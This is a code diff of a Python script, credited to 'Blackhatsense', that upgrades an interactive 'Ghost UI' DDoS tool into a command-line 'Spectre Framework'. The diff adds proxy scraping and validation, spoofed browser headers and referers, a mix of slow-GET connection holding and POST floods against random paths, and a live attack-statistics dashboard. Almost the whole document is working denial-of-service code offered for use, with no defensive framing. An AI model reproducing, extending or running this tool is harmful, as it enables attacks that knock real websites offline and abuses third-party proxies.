@@ -2,11 +2,12 @@
 # -*- coding: utf-8 -*-
 
 """
-[ G H O S T   U I ]
-Advanced Low & Slow DDoS Tool with Interactive Control Panel
+[ S P E C T R E   F R A M E W O R K ]
+Advanced Multi-Vector DDoS Tool with Real-time Dashboard
 Author: Blackhatsense
-Description: A stealthy connection exhaustion tool with a full
-             interactive menu for configuration and real-time monitoring.
+Description: A powerful, stealthy, and evasive connection and application layer
+             exhaustion tool. It combines slow attacks with POST floods and
+             advanced spoofing techniques.
 """
 
 import os
@@ -15,17 +16,20 @@ import time
 import random
 import threading
 import argparse
+import curses
 from urllib.parse import urlparse
 import socket
 
 # --- External Libraries ---
 try:
-    import requests
+    import httpx
+    from fake_useragent import UserAgent
 except ImportError:
-    print("[!] 'requests' not found. Install it with: pip3 install requests")
+    print("[!] Required libraries not found. Install them with:")
+    print("    pip3 install httpx fake-useragent")
     sys.exit(1)
 
-# --- UI Colors ---
+# --- UI Colors for Dashboard ---
 class Colors:
     RESET = '\033[0m'
     RED = '\033[91m'
@@ -36,50 +40,92 @@ class Colors:
     CYAN = '\033[96m'
     WHITE = '\033[97m'
     BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
 
-# --- Banner ---
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+# --- Configuration & Components ---
 
-def show_banner():
-    banner = f"""
-{Colors.BOLD}{Colors.CYAN}
-╔════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   {Colors.RED}G H O S T   U I{Colors.CYAN} - Interactive Control Panel           ║
-║                                                              ║
-║   {Colors.WHITE}Advanced Low & Slow HTTP DDoS Tool{Colors.CYAN}                   ║
-║                                                              ║
-╚════════════════════════════════════════════════════════════╝
-{Colors.RESET}
-"""
-    print(banner)
+class ProxyManager:
+    def __init__(self):
+        self.raw_proxies = []
+        self.validated_proxies = []
+        self.lock = threading.Lock()
 
-# --- Configuration & Proxy Fetcher (Same as before) ---
-USER_AGENTS = [ "Mozilla/5.0...", "..." ] # نفس القائمة الكبيمة من السكربت السابق
+    def fetch(self):
+        proxy_sources = [
+            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
+            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
+        ]
+        print(f"{Colors.YELLOW}[*] Fetching proxies...{Colors.RESET}")
+        for source in proxy_sources:
+            try:
+                with httpx.Client(timeout=10) as client:
+                    r = client.get(source)
+                    if r.status_code == 200:
+                        found = [line.strip() for line in r.text.splitlines() if ':' in line]
+                        self.raw_proxies.extend(found)
+            except Exception:
+                pass
+        self.raw_proxies = list(set(self.raw_proxies))
+        print(f"{Colors.GREEN}[+] Total unique raw proxies: {len(self.raw_proxies)}{Colors.RESET}")
 
-def get_proxies():
-    proxy_sources = [
-        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
-        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
-    ]
-    proxies = []
-    print(f"{Colors.YELLOW}[*] Fetching proxies...{Colors.RESET}")
-    for source in proxy_sources:
+    def _validate_proxy(self, proxy):
         try:
-            r = requests.get(source, timeout=10)
-            if r.status_code == 200:
-                found = [line.strip() for line in r.text.splitlines() if ':' in line]
-                proxies.extend(found)
-        except Exception: pass
-    proxies = list(set(proxies))
-    print(f"{Colors.GREEN}[+] Total unique proxies: {len(proxies)}{Colors.RESET}")
-    return proxies
+            with httpx.Client(proxies=f"http://{proxy}", timeout=8) as client:
+                r = client.get("http://httpbin.org/ip")
+                if r.status_code == 200:
+                    with self.lock:
+                        self.validated_proxies.append(proxy)
+                    return True
+        except Exception:
+            pass
+        return False
 
-# --- The Core Attack Class (Slightly Modified for UI integration) ---
-class PhantomCrawler:
+    def validate(self, threads=50):
+        if not self.raw_proxies:
+            self.fetch()
+        print(f"{Colors.YELLOW}[*] Validating {len(self.raw_proxies)} proxies with {threads} threads...{Colors.RESET}")
+        self.validated_proxies = []
+        threads_list = []
+        for proxy in self.raw_proxies:
+            t = threading.Thread(target=self._validate_proxy, args=(proxy,))
+            t.daemon = True
+            t.start()
+            threads_list.append(t)
+            if len(threads_list) >= threads:
+                for t_thread in threads_list:
+                    t_thread.join()
+                threads_list = []
+        
+        for t_thread in threads_list:
+            t_thread.join()
+
+        print(f"{Colors.GREEN}[+] Validation complete. {len(self.validated_proxies)} live proxies.{Colors.RESET}")
+        return self.validated_proxies
+
+class HeaderGenerator:
+    def __init__(self):
+        self.ua = UserAgent()
+        self.referers = [
+            "https://www.google.com/search?q=",
+            "https://www.facebook.com/",
+            "https://www.twitter.com/",
+            "https://www.reddit.com/",
+        ]
+
+    def get(self, target_host):
+        return {
+            "User-Agent": self.ua.random,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Referer": f"{random.choice(self.referers)}{random.randint(1000, 99999)}",
+            "Cache-Control": "max-age=0",
+            "Host": target_host,
+        }
+
+# --- The Core Attack Engine ---
+class SpectreEngine:
     def __init__(self, target_url, proxies, threads):
         self.target_url = target_url
         self.parsed_url = urlparse(target_url)
@@ -87,172 +133,190 @@ class PhantomCrawler:
         self.proxies = proxies
         self.threads = threads
         self.stop_event = threading.Event()
-        self.active_connections = 0
         self.lock = threading.Lock()
+        
+        # Stats
+        self.req_sent = 0
+        self.req_failed = 0
+        self.active_connections = 0
+        
+        self.header_gen = HeaderGenerator()
 
     def _get_random_proxy(self):
         if not self.proxies: return None
-        proxy = random.choice(self.proxies)
-        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+        return random.choice(self.proxies)
 
-    def _connection_exhaustion(self):
+    def _get_random_path(self):
+        paths = [
+            "/", "/login", "/wp-admin/", "/admin", "/api/v1/users", "/search",
+            "/index.html", "/contact", "/about-us", "/products", "/cart",
+            f"/{random.randint(1, 999999)}.jpg", f"/{random.randint(1, 999999)}.php"
+        ]
+        return random.choice(paths)
+
+    def _attack_worker(self):
         while not self.stop_event.is_set():
-            proxy_dict = self._get_random_proxy()
-            if not proxy_dict: time.sleep(5); continue
-            try:
-                s = requests.Session()
-                s.headers.update({"User-Agent": random.choice(USER_AGENTS), "Connection": "keep-alive"})
-                response = s.get(self.target_url, stream=True, timeout=15, proxies=proxy_dict)
-                with self.lock: self.active_connections += 1
-                response.raw.read(1)
-                time.sleep(random.randint(120, 300))
-                response.close(); s.close()
-                with self.lock: self.active_connections -= 1
-            except Exception:
-                with self.lock: self.active_connections -= 1
-                time.sleep(5)
+            proxy = self._get_random_proxy()
+            if not proxy:
+                time.sleep(1)
+                continue
+            
+            headers = self.header_gen.get(self.host)
+            path = self._get_random_path()
+            full_url = self.target_url + path
+            
+            # Randomly choose attack vector
+            if random.random() < 0.7: # 70% Slow GET
+                self._slow_get(full_url, proxy, headers)
+            else: # 30% POST Flood
+                self._post_flood(full_url, proxy, headers)
+            
+            time.sleep(random.uniform(0.5, 2.5))
+
+    def _slow_get(self, url, proxy, headers):
+        try:
+            with self.lock: self.active_connections += 1
+            with httpx.Client(proxies=f"http://{proxy}", timeout=20, http2=True) as client:
+                with client.stream("GET", url, headers=headers) as response:
+                    response.read(1) # Read one byte to establish connection
+                    with self.lock: self.req_sent += 1
+                    time.sleep(random.randint(300, 600)) # Hold connection open
+        except (httpx.RequestError, httpx.TimeoutException):
+            with self.lock: self.req_failed += 1
+        finally:
+            with self.lock: self.active_connections -= 1
+
+    def _post_flood(self, url, proxy, headers):
+        try:
+            with self.lock: self.active_connections += 1
+            post_data = {
+                "user": f"user_{random.randint(1000, 9999)}",
+                "pass": f"pass_{random.randint(1000, 9999)}",
+                "submit": "login"
+            }
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+            
+            with httpx.Client(proxies=f"http://{proxy}", timeout=10, http2=True) as client:
+                response = client.post(url, data=post_data, headers=headers)
+                with self.lock: self.req_sent += 1
+        except (httpx.RequestError, httpx.TimeoutException):
+            with self.lock: self.req_failed += 1
+        finally:
+            with self.lock: self.active_connections -= 1
 
     def start(self):
-        if not self.proxies: return
         for _ in range(self.threads):
-            t = threading.Thread(target=self._connection_exhaustion)
+            t = threading.Thread(target=self._attack_worker)
             t.daemon = True
             t.start()
 
     def stop(self):
         self.stop_event.set()
 
-# --- The Interactive Menu System ---
-class GhostUI:
-    def __init__(self):
-        self.target_url = ""
-        self.threads = 200
-        self.proxies = []
-        self.attacker = None
-        self.attack_thread = None
+# --- The Real-time Dashboard ---
+class SpectreDashboard:
+    def __init__(self, engine):
+        self.engine = engine
+        self.stdscr = None
 
-    def show_menu(self):
-        clear_screen()
-        show_banner()
+    def _draw(self):
+        self.stdscr.clear()
+        h, w = self.stdscr.getmaxyx()
         
-        # Display Status
-        status_color = Colors.GREEN if self.attacker and self.attacker.stop_event.is_set() == False else Colors.RED
-        status_text = "RUNNING" if self.attacker and self.attacker.stop_event.is_set() == False else "STOPPED"
-        print(f"{Colors.BOLD}--- Status ---{Colors.RESET}")
-        print(f"Attack Status: {status_color}{status_text}{Colors.RESET}")
-        if self.attacker:
-            with self.attacker.lock:
-                print(f"Active Connections: {Colors.YELLOW}{self.attacker.active_connections}{Colors.RESET}")
-        print("-" * 20)
+        # Title
+        title = " S P E C T R E   F R A M E W O R K "
+        self.stdscr.addstr(0, (w // 2) - len(title) // 2, title, curses.color_pair(1) | curses.A_BOLD)
         
-        # Display Configuration
-        print(f"{Colors.BOLD}--- Configuration ---{Colors.RESET}")
-        print(f"Target URL: {Colors.CYAN}{self.target_url or 'Not Set'}{Colors.RESET}")
-        print(f"Threads: {Colors.CYAN}{self.threads}{Colors.RESET}")
-        print(f"Proxies: {Colors.CYAN}{len(self.proxies)}{Colors.RESET}")
-        print("-" * 20)
+        # Status Box
+        status_text = "RUNNING" if not self.engine.stop_event.is_set() else "STOPPED"
+        status_color = curses.color_pair(2) if not self.engine.stop_event.is_set() else curses.color_pair(3)
+        self.stdscr.addstr(2, 2, "Status:", curses.A_BOLD)
+        self.stdscr.addstr(2, 10, status_text, status_color | curses.A_BOLD)
         
-        # Display Options
-        print(f"{Colors.BOLD}--- Menu ---{Colors.RESET}")
-        print("1. Set Target URL")
-        print("2. Set Number of Threads")
-        print("3. Fetch/Refresh Proxies")
-        print("4. Start Attack")
-        print("5. Stop Attack")
-        print("6. Exit")
-        print("-" * 20)
+        # Stats Box
+        self.stdscr.addstr(4, 2, "--- Statistics ---", curses.A_BOLD)
+        self.stdscr.addstr(5, 2, f"Target URL: {self.engine.target_url}")
+        self.stdscr.addstr(6, 2, f"Threads:    {self.engine.threads}")
+        self.stdscr.addstr(7, 2, f"Proxies:    {len(self.engine.proxies)}")
+        self.stdscr.addstr(8, 2, f"Active Con: {self.engine.active_connections}")
+        self.stdscr.addstr(9, 2, f"Req Sent:   {self.engine.req_sent}")
+        self.stdscr.addstr(10, 2, f"Req Failed: {self.engine.req_failed}")
         
-        choice = input(f"{Colors.GREEN}ghost_ui>{Colors.RESET} ")
-        self.handle_choice(choice)
+        rps = self.engine.req_sent / max(1, time.time() - self.start_time)
+        self.stdscr.addstr(11, 2, f"Req/s:      {rps:.2f}")
+        
+        # Instructions
+        self.stdscr.addstr(h-2, 2, "Press 'q' to stop and exit.", curses.A_DIM)
+        
+        self.stdscr.refresh()
 
-    def handle_choice(self, choice):
-        if choice == '1':
-            url = input("Enter target URL (e.g., https://example.com): ")
-            if urlparse(url).scheme in ['http', 'https']:
-                self.target_url = url
-                print(f"{Colors.GREEN}[+] Target set to: {self.target_url}{Colors.RESET}")
-            else:
-                print(f"{Colors.RED}[-] Invalid URL format.{Colors.RESET}")
-            input("Press Enter to continue...")
-
-        elif choice == '2':
+    def _run_loop(self):
+        self.start_time = time.time()
+        while not self.engine.stop_event.is_set():
             try:
-                t = int(input("Enter number of threads (e.g., 200): "))
-                if t > 0:
-                    self.threads = t
-                    print(f"{Colors.GREEN}[+] Threads set to: {self.threads}{Colors.RESET}")
-                else:
-                    print(f"{Colors.RED}[-] Threads must be a positive number.{Colors.RESET}")
-            except ValueError:
-                print(f"{Colors.RED}[-] Invalid input.{Colors.RESET}")
-            input("Press Enter to continue...")
+                self._draw()
+                time.sleep(1)
+            except curses.error:
+                break
 
-        elif choice == '3':
-            self.proxies = get_proxies()
-            input("Press Enter to continue...")
-
-        elif choice == '4':
-            if not self.target_url:
-                print(f"{Colors.RED}[-] Target URL is not set. Please set it first.{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            if not self.proxies:
-                print(f"{Colors.RED}[-] No proxies fetched. Please fetch them first.{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            if self.attacker and not self.attacker.stop_event.is_set():
-                print(f"{Colors.YELLOW}[*] Attack is already running.{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-            
-            print(f"{Colors.YELLOW}[*] Initializing attack...{Colors.RESET}")
-            self.attacker = PhantomCrawler(self.target_url, self.proxies, self.threads)
-            self.attack_thread = threading.Thread(target=self.attacker.start)
-            self.attack_thread.start()
-            print(f"{Colors.GREEN}[+] Attack started on {self.target_url}{Colors.RESET}")
-            time.sleep(2)
-
-        elif choice == '5':
-            if self.attacker and not self.attacker.stop_event.is_set():
-                print(f"{Colors.YELLOW}[*] Stopping attack...{Colors.RESET}")
-                self.attacker.stop()
-                # Wait for the attack thread to finish
-                if self.attack_thread.is_alive():
-                    self.attack_thread.join()
-                print(f"{Colors.GREEN}[+] Attack stopped.{Colors.RESET}")
-                self.attacker = None # Reset attacker instance
-            else:
-                print(f"{Colors.RED}[-] No active attack to stop.{Colors.RESET}")
-            input("Press Enter to continue...")
-            
-        elif choice == '6':
-            if self.attacker and not self.attacker.stop_event.is_set():
-                print(f"{Colors.YELLOW}[*] Stopping active attack before exiting...{Colors.RESET}")
-                self.attacker.stop()
-                if self.attack_thread.is_alive():
-                    self.attack_thread.join()
-            print(f"{Colors.BOLD}{Colors.CYAN}Exiting Ghost UI. Goodbye.{Colors.RESET}")
-            sys.exit(0)
-            
-        else:
-            print(f"{Colors.RED}[-] Invalid choice. Please try again.{Colors.RESET}")
-            time.sleep(1)
-
-    def run(self):
-        # Initial proxy fetch
-        self.proxies = get_proxies()
-        while True:
-            try:
-                self.show_menu()
-            except KeyboardInterrupt:
-                self.handle_choice('6') # Treat Ctrl+C as Exit
+    def start(self):
+        self.stdscr = curses.initscr()
+        curses.start_color()
+        curses.use_default_colors()
+        curses.curs_set(0)
+        curses.noecho()
+        self.stdscr.nodelay(1)
+        
+        # Color pairs
+        curses.init_pair(1, curses.CYAN, curses.COLOR_BLACK)
+        curses.init_pair(2, curses.GREEN, curses.COLOR_BLACK)
+        curses.init_pair(3, curses.RED, curses.COLOR_BLACK)
+        
+        try:
+            self._run_loop()
+        finally:
+            curses.endwin()
 
 # --- Main Execution ---
 def main():
+    parser = argparse.ArgumentParser(description="Spectre DDoS Framework")
+    parser.add_argument("url", help="Target URL (e.g., https://example.com)")
+    parser.add_argument("-t", "--threads", type=int, default=300, help="Number of attack threads (default: 300)")
+    parser.add_argument("--no-ui", action="store_true", help="Run without the real-time dashboard")
+    args = parser.parse_args()
+
     if os.name == 'nt':
         print(f"{Colors.YELLOW}[-] This script is best run on a Linux VPS for optimal performance.{Colors.RESET}")
-    ui = GhostUI()
-    ui.run()
+
+    # Initialize components
+    proxy_manager = ProxyManager()
+    valid_proxies = proxy_manager.validate()
+    
+    if not valid_proxies:
+        print(f"{Colors.RED}[-] No valid proxies found. Cannot start attack.{Colors.RESET}")
+        sys.exit(1)
+
+    engine = SpectreEngine(args.url, valid_proxies, args.threads)
+    
+    print(f"{Colors.GREEN}[+] Engine initialized. Starting attack on {args.url}{Colors.RESET}")
+    engine.start()
+
+    if args.no_ui:
+        print(f"{Colors.YELLOW}[*] Attack running in background. Press Ctrl+C to stop.{Colors.RESET}")
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[*] Stopping attack...{Colors.RESET}")
+            engine.stop()
+    else:
+        dashboard = SpectreDashboard(engine)
+        dashboard.start()
+        engine.stop()
+
+    print(f"{Colors.GREEN}[+] Attack stopped. Final stats:{Colors.RESET}")
+    print(f"    Requests Sent: {engine.req_sent}")
+    print(f"    Requests Failed: {engine.req_failed}")
 
 if __name__ == "__main__":
     main()
